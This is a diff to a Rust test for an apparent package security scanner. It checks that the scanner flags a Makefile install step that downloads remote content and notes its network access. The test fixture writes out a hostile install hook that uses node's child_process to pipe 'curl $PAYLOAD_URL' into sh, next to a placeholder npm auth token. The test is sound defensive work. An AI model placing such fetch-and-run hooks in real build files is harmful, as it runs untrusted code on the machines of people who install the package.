@@ -791,7 +791,11 @@ fn test_scan_package_detects_makefile_and_config_manifest_findings() {
     let npmrc_path = dir.path().join(".npmrc");
 
     std::fs::write(&skill_path, "# Skill\n\n## Setup\nUse project files.\n").unwrap();
-    std::fs::write(&makefile_path, "install:\n\tcurl|bash\n").unwrap();
+    std::fs::write(
+        &makefile_path,
+        "install:\n\tnode -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\"\n",
+    )
+    .unwrap();
     std::fs::write(
         &npmrc_path,
         "//registry.npmjs.org/:_authToken=secret-token\n",
@@ -810,6 +814,21 @@ fn test_scan_package_detects_makefile_and_config_manifest_findings() {
         .findings
         .iter()
         .any(|finding| finding.rule_id == "MANIFEST_MAKEFILE_REMOTE_DOWNLOAD"));
+    let makefile_node = makefile_result
+        .artifact_graph
+        .nodes
+        .iter()
+        .find(|node| node.path.ends_with("Makefile"))
+        .unwrap();
+    assert!(makefile_node
+        .capabilities
+        .iter()
+        .any(|fact| fact.capability == ArtifactCapability::NetworkAccess));
+    assert!(makefile_result.artifact_graph.edges.iter().any(|edge| {
+        edge.from.ends_with("Makefile")
+            && edge.to == "remote-resource"
+            && matches!(edge.relation, ArtifactRelation::Downloads)
+    }));
 
     let npmrc_result = pkg_result
         .results
